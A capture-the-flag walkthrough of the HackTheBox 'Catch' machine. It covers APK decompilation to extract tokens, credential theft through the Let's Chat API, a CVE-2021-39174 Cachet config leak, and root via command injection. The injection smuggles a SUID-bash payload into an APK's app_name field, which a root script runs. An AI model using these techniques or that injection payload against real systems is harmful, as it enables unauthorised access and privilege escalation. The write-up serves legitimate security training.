---
title: "Walk-through of Catch from HackTheBox"
header:
  teaser: /assets/images/2022-04-20-22-37-05.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Apktool
  - Gitea
  - Cachet
  - CVE-2021-39174
  - Jarsigner
  - keytool
---

## Machine Information

![catch](/assets/images/2022-04-20-22-37-05.png)

Catch is rated as a medium machine on HackTheBox. This Linux box has a number of open ports, but we start with an APK we download and decompile to find a bearer token. With that we find credentials in Cachet that gives us access, allowing the use of a known CVE to retrieve more credentials. These give us access to SSH, after enumeration of the OS we find an insecurely written script that we can take advantage to get to root.

<!--more-->

Skills required are enumeration and using known exploits. Skills learned are decompiling and manipulating APK files.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Catch](https://www.hackthebox.com/home/machines/profile/450) |
| Machine Release Date | 12th February 2022 |
| Date I Completed It | 10th April 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root㉿kali)-[~/htb/catch]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.150 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/catch]
└─# nmap -p$ports -sC -sV -oA catch 10.10.11.150
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-20 22:34 BST
Nmap scan report for 10.10.11.150
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Set-Cookie: i_like_gitea=b5ddf13b7cbbeffa; Path=/; HttpOnly
|     Set-Cookie: _csrf=DuYT5BqZrZoxwQrqyrUwtQmnF1A6MTY1MDQ5MDQ4NDcxMjk5MTc0Ng; Path=/; Expires=Thu, 21 Apr 2022 21:34:44 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 20 Apr 2022 21:34:44 GMT
|_    Content-Length: 0
5000/tcp open  upnp?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Location: /login
|     Vary: Accept, Accept-Encoding
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 28
|     Set-Cookie: connect.sid=s%3AHLCki6mU6RyApD6tF7JCNjavDNPd9M3W.GY3C5BO46Ulsf493qWeXyrK3%2BjWZZjvDTWxyeSlWs1w; Path=/; HttpOnly
|     Date: Wed, 20 Apr 2022 21:34:43 GMT
|     Connection: close
|     Found. Redirecting to /login
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Content-Security-Policy: 
|     X-Content-Security-Policy: 
|     X-WebKit-CSP: 
|     X-UA-Compatible: IE=Edge,chrome=1
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Set-Cookie: connect.sid=s%3AyurcKbwVy_sE1YCjzb7llWo2qYCe4cGt.0sZrRMPPE5FHi8fwUHiwVZDaE0mH02XRTvqdc4B7tic; Path=/; HttpOnly
|     Vary: Accept-Encoding
|     Date: Wed, 20 Apr 2022 21:34:45 GMT
|     Connection: close
|_    GET,HEAD
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Catch Global Systems
|_http-server-header: Apache/2.4.29 (Ubuntu)
Nmap done: 1 IP address (1 host up) scanned in 99.30 seconds
```

We find a few ports open, let's start with 80 as usual:

![catch-website-port80](/assets/images/2022-04-21-22-24-17.png)

This is a static site which mentions Lets-Chat and Gitea integration but there's nothing obvious to be found.

## Download APK

There is a Download Now button that gives us an apk file. Let's grab that:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# wget http://catch.htb/catchv1.0.apk
--2022-04-21 22:25:51--  http://catch.htb/catchv1.0.apk
Resolving catch.htb (catch.htb)... 10.10.11.150
Connecting to catch.htb (catch.htb)|10.10.11.150|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3356353 (3.2M) [application/vnd.android.package-archive]
Saving to: ‘catchv1.0.apk’
catchv1.0.apk      100%[===============>]   3.20M  3.51MB/s    in 0.9s    
2022-04-21 22:25:52 (3.51 MB/s) - ‘catchv1.0.apk’ saved [3356353/3356353]
```

## Gitea

With nothing more to look at here let's try port 3000 which nmap found earlier:

![catch-gitea-port3000](/assets/images/2022-04-21-22-35-25.png)

Here we find an installation of [Gitea](https://docs.gitea.io/en-us/) which is like a self-hosted version of Github. Looking around it there is nothing obvious here either, and I couldn't find an exploit for this version.

## Let's Chat Login

On to the next one nmap found which was port 5000:

![catch-letschat-port5000](/assets/images/2022-04-21-22-39-07.png)

Now we find a login page for an installation of [Lets Chat](https://github.com/sdelements/lets-chat) which is self hosted chat app for small teams.

## Cachet Login

Finally let's look at the last port we found which was 8000:

![catch-cachet-port8000](/assets/images/2022-04-21-22-43-49.png)

This is a login to a local install of [Cachet](https://cachethq.io/) which is an open source status page system.

## Decompile APK

So we have a number of things to look in to. I went right back to the start and decompiled the apk I downloaded:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# apktool           
Command 'apktool' not found, but can be installed with:
apt install apktool
Do you want to install it? (N/y)y
apt install apktool
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  aapt android-framework-res android-libaapt android-libandroidfw android-libbacktrace android-libbase android-libcutils android-liblog android-libunwind android-libutils android-libziparchive junit libantlr-java
  libantlr3-runtime-java libapache-pom-java libatinject-jsr330-api-java libcommons-cli-java libcommons-io-java libcommons-lang3-java libcommons-parent-java libguava-java libjsr305-java libsmali-java libstringtemplate-java
  libxmlunit-java libxpp3-java libyaml-snake-java
0 upgraded, 28 newly installed, 0 to remove and 151 not upgraded.
Need to get 21.8 MB of archives.
After this operation, 58.3 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://http.kali.org/kali kali-rolling/main amd64 android-liblog amd64 1:10.0.0+r36-10 [44.8 kB]
Get:2 http://http.kali.org/kali kali-rolling/main amd64 android-libbase amd64 1:10.0.0+r36-10 [41.9 kB]
Get:3 http://http.kali.org/kali kali-rolling/main amd64 android-libunwind amd64 10.0.0+r36-4 [48.3 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 android-libbacktrace amd64 1:10.0.0+r36-10 [156 kB]
Get:5 http://http.kali.org/kali kali-rolling/main amd64 android-libcutils amd64 1:10.0.0+r36-10 [33.8 kB]
Get:6 http://http.kali.org/kali kali-rolling/main amd64 android-libutils amd64 1:10.0.0+r36-10 [63.1 kB]
Get:7 http://http.kali.org/kali kali-rolling/main amd64 android-libziparchive amd64 1:10.0.0+r36-10 [35.9 kB]
Get:8 http://http.kali.org/kali kali-rolling/main amd64 android-libandroidfw amd64 1:10.0.0+r36-3 [148 kB]
Get:9 http://http.kali.org/kali kali-rolling/main amd64 android-libaapt amd64 1:10.0.0+r36-3 [217 kB]
Get:28 http://http.kali.org/kali kali-rolling/main amd64 apktool all 2.5.0+dfsg.1-2 [213 kB]
Fetched 21.8 MB in 3s (6,681 kB/s) 
<SNIP>
Setting up android-libbacktrace (1:10.0.0+r36-10) ...
Setting up libcommons-io-java (2.11.0-2) ...
Setting up android-libutils (1:10.0.0+r36-10) ...
Setting up android-libandroidfw:amd64 (1:10.0.0+r36-3) ...
Setting up android-libaapt:amd64 (1:10.0.0+r36-3) ...
Setting up aapt (1:10.0.0+r36-3) ...
Setting up apktool (2.5.0+dfsg.1-2) ...
```

[Apktool](https://ibotpeaches.github.io/Apktool/) is nice and simple to use for this. It wasn't installed but is in the Kali repository so after it's done we can use to decompile the apk:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# apktool d catchv1.0.apk 
I: Using Apktool 2.5.0-dirty on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Now we have a folder with all the files from the apk. After a bit of grepping I eventually found this:

```sh
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# grep -r "_token"          
smali/com/example/acatch/R$string.smali:.field public static final gitea_token:I = 0x7f0e0028
smali/com/example/acatch/R$string.smali:.field public static final lets_chat_token:I = 0x7f0e002c
smali/com/example/acatch/R$string.smali:.field public static final slack_token:I = 0x7f0e0065
res/values/strings.xml:    <string name="gitea_token">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>
res/values/strings.xml:    <string name="lets_chat_token">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>
res/values/strings.xml:    <string name="slack_token">xoxp-23984754863-2348975623103</string>
res/values/public.xml:    <public type="string" name="gitea_token" id="0x7f0e0028" />
res/values/public.xml:    <public type="string" name="lets_chat_token" id="0x7f0e002c" />
res/values/public.xml:    <public type="string" name="slack_token" id="0x7f0e0065" />
```

## Enumerating Let's Chat

Which is a file called strings.xml with tokens for gitea, lets chat and slack. The Lets Chat one is what we wanted, but it took me a fair bit of working out. To start with I found [this](https://github.com/sdelements/lets-chat/issues/436) and [this](https://github.com/taigaio/taiga-contrib-letschat/issues/2) which helped with how to use a bearer token, like the one we've just found, and using curl to interact with the Lets Chat API.

I also found [this](https://github.com/sdelements/lets-chat/wiki/API) which shows you how to use the API to retrieve data. First I looked at account:

```sh
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/account/" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp                              
{
   "avatar" : "e2b5310ec47bba317c5f1b5889e96f04",
   "displayName" : "Admin",
   "firstName" : "Administrator",
   "id" : "61b86aead984e2451036eb16",
   "lastName" : "NA",
   "openRooms" : [
      "61b86b28d984e2451036eb17",
      "61b86b3fd984e2451036eb18",
      "61b8708efe190b466d476bfb"
   ],
   "username" : "admin"
}
```

This showed a list of open rooms. Next I looked at the first room on the list:

```sh
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp 
{
   "created" : "2021-12-14T10:00:08.384Z",
   "description" : "Cachet Updates and Maintenance",
   "hasPassword" : false,
   "id" : "61b86b28d984e2451036eb17",
   "lastActive" : "2021-12-14T10:34:20.749Z",
   "name" : "Status",
   "owner" : "61b86aead984e2451036eb16",
   "participants" : [],
   "private" : false,
   "slug" : "status"
}
```

Not overly helpful, although it does mention Cachet which we found earlier on port 8000. Looking at the docs again you can list all messages in a room, let's do that:

```json
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# curl -s -X GET "http://catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages" -H "Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==" | json_pp
[
<SNIP>
   {
      "id" : "61b8702dfe190b466d476bfa",
      "owner" : "61b86f15fe190b466d476bf5",
      "posted" : "2021-12-14T10:21:33.859Z",
      "room" : "61b86b28d984e2451036eb17",
      "text" : "Here are the credentials `john :  E}V!mywu_69T4C}W`"
   },
<SNIP>
]
```

## Cachet Access As John

There's a few messages but this one is interesting. Let's try it on the login page we found earlier:

![catch-cachet-login](/assets/images/2022-04-22-16-38-07.png)

It works and we are in:

![catch-cachet-dashboard](/assets/images/2022-04-22-16-39-06.png)

## CVE-2021-39174

I don't know how to use this. On the settings page it tells us the version is 2.4.0-dev. A search for an exploit brings [this](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection) one up at the top. Looking at that there is a section on CVE-2021-39174 which shows you can leak configuration details via a nested variable. There's a video as well, but it's easy to do. Go to Setting and the Mail, start Burp listening and click the Save button:

![catch-cachet-mail](/assets/images/2022-04-22-17-23-41.png)

Switch to Burp to see the intercepted request:

![catch-burp-intercept](/assets/images/2022-04-22-17-24-51.png)

Change the config[mail_driver] section from smtp to ${DB_USERNAME} and then click Forward:

![catch-burp-forward](/assets/images/2022-04-22-17-27-07.png)

Click Forward again if you get another reply, then switch Intercept off and switch back to the website:

![catch-cachet-awesome](/assets/images/2022-04-22-17-28-07.png)

We see the message Awesome indicating the settings were updated. Now click Test and confirm:

![catch-cachet-error500](/assets/images/2022-04-22-17-29-30.png)

This error screen wasn't what the article suggested I'd see, but after a bit of searching the logs we find the leak was successful:

![catch-cachet-will](/assets/images/2022-04-22-17-33-04.png)

The DB_USERNAME is will. Now repeat the above intercepting the save in Burp, setting config[mail_driver to ${DB_PASSWORD}, forward in Burp then click Test on the website. Looking in the logs we now have the password:

![catch-cachet-password](/assets/images/2022-04-22-17-36-14.png)

## SSH Access As Will

It turns out these database credentials have been reused for SSH access:

```sh
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# ssh will@catch.htb                                         
will@catch.htbs password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)

  System information as of Fri 22 Apr 2022 04:37:04 PM UTC

  System load:                      0.6
  Usage of /:                       71.7% of 16.61GB
  Memory usage:                     84%
  Swap usage:                       29%
  Processes:                        445
  Users logged in:                  1
  IPv4 address for br-535b7cf3a728: 172.18.0.1
  IPv4 address for br-fe1b5695b604: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.150

Last login: Fri Apr 22 16:16:22 2022 from 10.10.14.101
will@catch:~$ 
```

## User Flag

Let's grab the user flag before moving on:

```sh
will@catch:~$ cat user.txt 
14c926ad5fee703cd6f26b9ec681ae23
```

## Pspy64

I tried [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) but didn't find anything so I had a look at running processes with [pspy](https://github.com/DominicBreuker/pspy).

First grab the latest version and copy over to the box:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
--2022-04-22 17:41:08--  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64      100%[===========================================>]   2.94M  2.68MB/s    in 1.1s    
2022-04-22 17:41:10 (2.68 MB/s) - ‘pspy64’ saved [3078592/3078592]

┌──(root㉿kali)-[~/htb/catch]
└─# scp pspy64 will@catch.htb:~
will@catch.htbs password: 
pspy64                                                        100% 3006KB   1.7MB/s   00:01
```

Now switch back to the box and run pspy:

```sh
will@catch:~$ chmod +x pspy64 
will@catch:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/04/22 16:43:01 CMD: UID=0    PID=27258  | /bin/sh -c /opt/mdm/verify.sh 
2022/04/22 16:43:01 CMD: UID=0    PID=27257  | 
2022/04/22 16:43:01 CMD: UID=0    PID=27260  | /bin/bash /opt/mdm/verify.sh 
2022/04/22 16:43:01 CMD: UID=???  PID=27262  | ???
2022/04/22 16:43:01 CMD: UID=0    PID=27261  | /bin/bash /opt/mdm/verify.sh 
2022/04/22 16:43:01 CMD: UID=0    PID=27264  | openssl rand -hex 12 
2022/04/22 16:43:01 CMD: UID=0    PID=27265  | mv /opt/mdm/apk_bin/*.apk /root/mdm/apk_bin/993b3ab96b64ee8da5b781cf.apk 
2022/04/22 16:43:01 CMD: UID=0    PID=27266  | jarsigner -verify /root/mdm/apk_bin/993b3ab96b64ee8da5b781cf.apk 
2022/04/22 16:43:01 CMD: UID=0    PID=27285  | /lib/systemd/systemd-udevd 
2022/04/22 16:43:02 CMD: UID=0    PID=27292  | grep -v verify.sh 
2022/04/22 16:43:02 CMD: UID=0    PID=27291  | grep -v apk_bin 
2022/04/22 16:43:02 CMD: UID=0    PID=27290  | 
2022/04/22 16:43:02 CMD: UID=0    PID=27289  | /bin/bash /opt/mdm/verify.sh
```

## Code Review

After only a few seconds we see a shell script called verify.sh is run frequently by root. Let's it down so we understand it.

This first section is using jarsigner to check the apk being accessed has a valid certificate:

```sh
will@catch:~$ cat /opt/mdm/verify.sh
#!/bin/bash

###################
# Signature Check #
###################

sig_check() {
        jarsigner -verify "$1/$2" 2>/dev/null >/dev/null
        if [[ $? -eq 0 ]]; then
                echo '[+] Signature Check Passed'
        else
                echo '[!] Signature Check Failed. Invalid Certificate.'
                cleanup
                exit
        fi
}
```

This section is checking the apk was compiled with with a version of the SDK that is greater than 18:

```sh
#######################
# Compatibility Check #
#######################

comp_check() {
        apktool d -s "$1/$2" -o $3 2>/dev/null >/dev/null
        COMPILE_SDK_VER=$(grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml")
        if [ -z "$COMPILE_SDK_VER" ]; then
                echo '[!] Failed to find target SDK version.'
                cleanup
                exit
        else
                if [ $COMPILE_SDK_VER -lt 18 ]; then
                        echo "[!] APK Doesn't meet the requirements"
                        cleanup
                        exit
                fi
        fi
}
```

This section is checking the app name using the value set in the /res/values/strings.xml file:

```sh
####################
# Basic App Checks #
####################

app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

This is our vulnerability we can use to exploit the script. You can see $APP_NAME is set to a value from the strings.xml file. It checks the name contains Catch, then executes mkdir {}. This lack of sanitisation allows us to execute further commands by separating them with semi-colons.

The last part of the script set's the folders it will use, and then executes the functions from above in a loop on each apk it finds in the DROPBOX folder:

```sh
###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
        APK_NAME="$(openssl rand -hex 12).apk"
        if [[ -L "$IN_APK_NAME" ]]; then
                exit
        else
                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
        fi
        sig_check $IN_FOLDER $APK_NAME
        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
cleanup
```

So a summary of what we need to do is:

```text
1. Edit the strings.xml file on Kali for the catchv1.0.apk we decompiled earlier.
2. Put the commands we want to execute separated by a ;.
3. Compile the apk.
4. Sign it.
5. Upload to the box in folder /opt/mdm/apk_bin.
6. Wait for glory.
```

## Exploit APK Vulnerability

Let's do it. First open the strings file in your editor of choice:

```sh
┌──(root㉿kali)-[~/htb/catch/catchv1.0]
└─# nano res/values/strings.xml 
```

Look for this line:

```sh
   <string name="app_name">Catch</string>
```

Change it to this, or whatever else you wanted to execute as root:

```sh
    <string name="app_name">Catch999;cp /bin/bash /tmp/pencer; chmod +s /tmp/pencer</string>
```

Here I'm copying bash as root them modifying permissions so I can execute as user Will to get a root shell.

I used [this](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82) guide for help with the steps to compile, and sign our apk.

Let's compile the apk using apktool:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# java -jar apktool_2.6.1.jar b -f -d /root/htb/catch/catchv1.0 -o /root/htb/catch/catch_pencer.apk                   
I: Using Apktool 2.6.1
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

NOTE: this doesn't work with the latest version of apktool in the Kali repo. That one is 2.5, you need 2.6.1 for this to work so grab it from [here](https://apktool.en.lo4d.com/download) if needed.

Now we need to sign it. First generate our keys:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
Enter keystore password:  
Re-enter new password: 
What is your first and last name?
  [Unknown]:  1
What is the name of your organizational unit?
  [Unknown]:  1
What is the name of your organization?
  [Unknown]:  1
What is the name of your City or Locality?
  [Unknown]:  1
What is the name of your State or Province?
  [Unknown]:  1
What is the two-letter country code for this unit?
  [Unknown]:  us
Is CN=1, OU=1, O=1, L=1, ST=1, C=us correct?
  [no]:  yes
Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
        for: CN=1, OU=1, O=1, L=1, ST=1, C=us
[Storing my-release-key.keystore]
```

Then sign it with jarsigner, but here I had a problem because jarsigner is not available in Kali 2022.1. Checking we can see we have java 11 installed:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# update-alternatives --config java
There is 1 choice for the alternative java (providing /usr/bin/java).
  Selection    Path                                         Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
Press <enter> to keep the current choice[*], or type selection number:                 
```

Still jarsigner is not there, so I installed openjedk and it added more packages:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# apt-get install openjdk-11-jdk
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev
Suggested packages:
  libice-doc libsm-doc libx11-doc libxcb-doc libxt-doc openjdk-11-demo openjdk-11-source visualvm
The following NEW packages will be installed:
  libice-dev libpthread-stubs0-dev libsm-dev libx11-dev libxau-dev libxcb1-dev libxdmcp-dev libxt-dev openjdk-11-jdk openjdk-11-jdk-headless x11proto-dev xorg-sgml-doctools xtrans-dev
0 upgraded, 13 newly installed, 0 to remove and 151 not upgraded.
Need to get 223 MB of archives.
After this operation, 239 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
<SNIP>
```

I set alternative to manual mode:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# update-alternatives --config java
There is 1 choice for the alternative java (providing /usr/bin/java).
  Selection    Path                                         Priority   Status
------------------------------------------------------------
  0            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      auto mode
* 1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java   1111      manual mode
Press <enter> to keep the current choice[*], or type selection number: 
```

Now jarsigner is available:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# jarsigner
Usage: jarsigner [options] jar-file alias
       jarsigner -verify [options] jar-file [alias...]

[-keystore <url>]           keystore location
<SNIP>
```

Back to signing our newly built apk:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catch_pencer.apk alias_name
Enter Passphrase for keystore: 
   adding: META-INF/MANIFEST.MF
   adding: META-INF/ALIAS_NA.SF
   adding: META-INF/ALIAS_NA.RSA
  signing: classes.dex
  signing: AndroidManifest.xml
  signing: resources.arsc
  signing: res/animator/mtrl_extended_fab_show_motion_spec.xml
<SNIP>
```

We can use scp to copy our file over to the /opt/mdm/apk_bin folder:

```sh
┌──(root㉿kali)-[~/htb/catch]
└─# sshpass -p 's2#4Fg0_%3!' scp catch_pencer.apk will@catch.htb:/opt/mdm/apk_bin
```

Switch back to our ssh session as the user Will on the box. Wait for a few minutes then check /tmp:

```sh
will@catch:~$ ll /tmp/pencer
-rwsr-sr-x 1 root root 1183448 Apr 23 14:28 /tmp/pencer*
```

## Root Flag

Our copy of bash is there called pencer with permissions modified. Now let's get the root flag:

```sh
will@catch:~$ /tmp/pencer -p
pencer-5.0# whoami
root
pencer-5.0# cat /root/root.txt
340847d2ddd0d39864d988d72c4658ee
```

That was a pretty tricky box for me. I hope this walkthough helped you get through it. See you next time.
